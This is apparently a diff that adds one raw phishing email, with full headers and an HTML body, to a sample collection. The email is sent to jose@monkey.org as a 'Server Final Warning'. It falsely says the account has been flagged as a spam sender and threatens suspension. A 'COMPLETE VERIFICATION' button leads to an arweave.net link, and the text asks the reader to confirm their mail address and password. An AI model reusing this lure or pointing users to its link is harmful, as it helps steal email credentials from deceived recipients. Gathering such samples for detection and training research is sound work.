@@ -1,0 +1,124 @@
+From jose@monkey.org Wed Feb  8 13:50:11 2023 +0000
+Return-Path: info@eedeka.com
+Delivered-To: jose@monkey.org
+X-FDA: 80444258622.12.356F983
+Received: from slot0.eedeka.com (slot0.eedeka.com [109.206.240.168])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id EFE68800C211
+	for <jose@monkey.org>; Wed,  8 Feb 2023 13:50:10 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=eedeka.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=info@eedeka.com;
+ bh=dD1BosQ+bGGHAW98Vtrz7WpfRVg=;
+ b=rAhGU9WLMEhcs58rCGdRDPQoESDmivVWwhIiosEb/zPdm1NICvP84clviCBJo9ypbJ0PhvSyVjRr
+   xt8AzIR1clHpX/sTq2Gg0Xpj1dbPXjY4VYIOwYlw44N+SA7AdL1j1M8KluSFNI56GyGEDhf5xxEq
+   5AcuF0R5Zhpf6TlJPbOMdOKAIGeRhks7szpsRmcils+2Ufp2fXQenWHnFEa+37+8bC10G4sOD8nt
+   PxYRkRTTq/JBhx61PDB9GYRRfBNMp519vcVaU6QAWkgPFkRLyKwiqz37HeKdBPqVOWQKwE/Ip42s
+   D/LTGnRHXjm5rFvdVvQglSd2cgWvkh+Wz1QIPQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=eedeka.com;
+ b=mlVZMvxjCR5sv6byoT0c4elkgdmhAQdfqlnL13AJnSenkQIh/9jHgp5rFrzw6u0VCvTz+WtAYzjP
+   PjSZ+mLzPmqDikEoYfvtgxduKMlD7O90yzpUM6cnzRiD8hjumutXL9w5ucGemi8KtD2+pU/7ZKqv
+   I5OO05Fmhggw9EYl/594MxKdHYUVXs63tbqKdRrgfrOgF0p2UqZqsKLtwhtILncEQFWzfY3xMUna
+   atHgyIvBo186VNPLsPx83l4sTLyweCaoMrdk1pIJ3cZlkuZzVOu/aGc5ySx8fMSKudlfNTrpk622
+   mKT2cEb2qPsZAgKiVH2+ag2B3blARerGGU2Z1w==;
+From: jose Server <info@eedeka.com>
+To: jose@monkey.org
+Subject: Server Final Warning
+Date: 08 Feb 2023 15:51:01 +0200
+Message-ID: <20230208155101.2A76A57C75CF80A3@eedeka.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1675864211; a=rsa-sha256;
+	cv=none;
+	b=REkm5iAhDI22AC3B8zt4IVUPUfvw3HzKx4myXUdG5Ui3NvSMQztB5FmTFA5YBRSVWjrVIa
+	6wuHmyRAIS6yiT2k2QSC3RRNvwO/bixHA0C3Ir/ihnzx3btQjYZ0JcQtj7PbtbvVe+pCwT
+	jyzRGlSAGoYb5eR0sEZW5qyza3YX7gM=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=pass header.d=eedeka.com header.s=dkim header.b=rAhGU9WL;
+	spf=pass (imf20.b.hostedemail.com: domain of info@eedeka.com designates 109.206.240.168 as permitted sender) smtp.mailfrom=info@eedeka.com;
+	dmarc=pass (policy=none) header.from=eedeka.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1675864211;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Zuk9Eyo4XLov95cI2vhLzY6zisHMkpqx9WStB/nL3LI=;
+	b=V4oVpGW5zLY11US0aOuv5pxA+6YuSNKrgQABMe3Sv6sLY1hrKqVErT2uy5c4EcYXgi7h8p
+	+zLB7TmtTNIG5BCHKUivblEcEjwURmHw4eX+MnE4Jx5QTG3rAnYvGVOJRAbK3aUSI/mQ5e
+	uMZPf8GRHtu7zC6laDykmd6Dyp2Es9Q=
+X-Spam-Status: No, score=-0.05
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: EFE68800C211
+X-Rspam-User: 
+X-Stat-Signature: ictqjit9n39eio1x6w55ahxkbqzewirb
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=pass header.d=eedeka.com header.s=dkim header.b=rAhGU9WL;
+	spf=pass (imf20.b.hostedemail.com: domain of info@eedeka.com designates 109.206.240.168 as permitted sender) smtp.mailfrom=info@eedeka.com;
+	dmarc=pass (policy=none) header.from=eedeka.com
+X-HE-Tag: 1675864210-986250
+X-HE-Meta: U2FsdGVkX1+pQDWkLSRelvu4Z4KAqgMRbWPiC72Cc2Ca2mJfzWZrGIvrjEZsOuKBI1ok8aUc4ki6IPwQkMvI6uBxy8vmAVP1wfps1H11FFjacbaS/X7niaYLoVqmXzdv3faYXDpdTmKw5Cddl+niNwfz3h+WeLytZZE9nCE17DRMlQOy9/uPM+HzzjysO6D1Y+pDSQ8CHnFRprapTQJ/Ooocuzg6AeGXZ9+3PaSAq/3m3Q3wh2Gp5uVoLBx0YE/P506BVqcJuG56Hf/VuHduQ5t30BFat23M7epFJlFea37dhzk0Tw2NeStg+T1ChSTSZJY+mJgxOL1jNL4bhdt1Nam5G6tnq8fA3PctW/xoocdKhFH72pHcBnBTgZpnnLczdqF8gQrzEs/ptdKHRbYQdorwRsN/TPDVN00B1G0dMccTPHWbidbEiIHc8XPkgtHswiOaKMB2zjSeSCixo0w1NKBrLr6HUDl4yi8wrQasX4eZyBTmJhQkc1S5PTce6+LJggoOASpAJUU0cFAznEAWwZ840Zj2D1TVa/nZiNAO3XME4d6hDymbnWooJKfgMZs4rYAv2Eh5LTGOs93XIzl5WkP9lQ/BejuiiQOJ7avXGpjr4q7Uykb2bBMR6/QX/QcMEzL2WYUYZaETYn+h69425bRs1K9zQw/OhYc2ou9H2Vj0XqSGcIwxbyfwMvoRMJv6qPqfrt0DGC5bBHfcDIBYcqEL4VzSEZULy+/0GZw+0WcjS8rjOEsxyh6gIwAeNriBm4YMBCebGtKm+/JA0XHc1qQ7P+HM/RAZ34aIO/zssQJjJzcjbizwnlS9dtbK8eB0sE6Gauo4+Wd2EKLLI+xl6joSstWzNIj2keRdmszfQU6JUPisPrVMFZ16F8bndD71yznK1Dz7KV4esqD4mXlBCJ2Ib+t/3+IF2kmjGVgPQPBhpQqGhTPs9eR4UQTbuWSO07Rd97Vg0H4=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 31
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P><BR class=3DApple-interchange-newline>
+<table style=3D"FONT-SIZE: small; FONT-FAMILY: gulim, arial; WHITE-SPACE: n=
+ormal; WORD-SPACING: 0px; TABLE-LAYOUT: fixed; TEXT-TRANSFORM: none; FONT-W=
+EIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2=
+; LETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps=
+: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initia=
+l; text-decoration-style: initial; text-decoration-color: initial" cellspac=
+ing=3D"0" cellpadding=3D"0" width=3D"85%" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"PADDING-TOP: 30px; MARGIN: 0px; LINE-HEIGHT: 1.666" valign=3D"=
+top" align=3D"center"><SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=
+=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT =
+style=3D"VERTICAL-ALIGN: inherit">Take Note :&nbsp;</FONT></FONT><BR><FONT =
+style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">&=
+nbsp;&nbsp; Your mail account jose@monkey.org has been flagged as a spam se=
+nder.&nbsp;</FONT></FONT></SPAN></SPAN>
+&nbsp;monkey.org<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERT=
+ICAL-ALIGN: inherit">&nbsp;<WBR>Maintenance&nbsp;Service 2023</FONT></FONT>=
+</TD></TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 20px; MARGIN: 0px; LINE-HEI=
+GHT: 1.666" valign=3D"top" align=3D"center"><BR></TD></TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 20px; MARGIN: 0px; LINE-HEIGHT: 1.666" align=
+=3D"center">
+<A style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 13px; FONT-FAMILY: inherit; =
+BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BACKGROUND-IMAGE: none; =
+BORDER-BOTTOM-WIDTH: 0px; BACKGROUND-REPEAT: repeat; TEXT-TRANSFORM: upperc=
+ase; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADD=
+ING-LEFT: 30px; MARGIN: 0px 10px 0px 0px; DISPLAY: inline-block; PADDING-RI=
+GHT: 30px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(16,173,228); font-s=
+tretch: inherit; border-radius: 20px;=20
+background-size: auto; text-decoration-line: none" href=3D"https://csmvpuli=
+fxvnfmyuilggojxofnt4cxggt6z3ac4uf4dmbrmbg26q.arweave.net/FJlX0Wgt6tKzFELMZy=
+buK2fBXMafs7ALlC8GwMWBNr0#jose@monkey.org" rel=3D"noopener noreferrer" targ=
+et=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://=
+r7zw2ghyiiywjudn7j7jgrzaeyrp5dmm7ojyzwy6opdeinbt37ta.arweave.net/j_NtGPhCMW=
+TQbfp-k0cgJiL-jYz7k4zbHnPGRDQz3-Y%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&=
+amp;ust=3D1675865338250000&amp;usg=3DAOvVaw174CYphms4_9aEc1Bq4rJH">
+<SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=3D"VERTICAL-ALIGN: inhe=
+rit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN:=
+ inherit">COMPLETE VERIFICATION</FONT></FONT></SPAN></SPAN></A><BR><BR><FON=
+T style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"=
+>To keep your account from being suspended<BR>Please double-check your mail=
+ address and password to complete the verification process.<FONT size=3D3><=
+BR></FONT></FONT></FONT>&nbsp;<BR>
+monkey.org<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-A=
+LIGN: inherit">&nbsp;&nbsp; &copy; 2023 All rights reserved<BR><FONT style=
+=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT =
+size=3D3>This service is provided without charge.&nbsp;</FONT></FONT></FONT=
+>&nbsp;<BR></FONT></FONT></TD></TR></TBODY></TABLE></P></BODY></HTML>
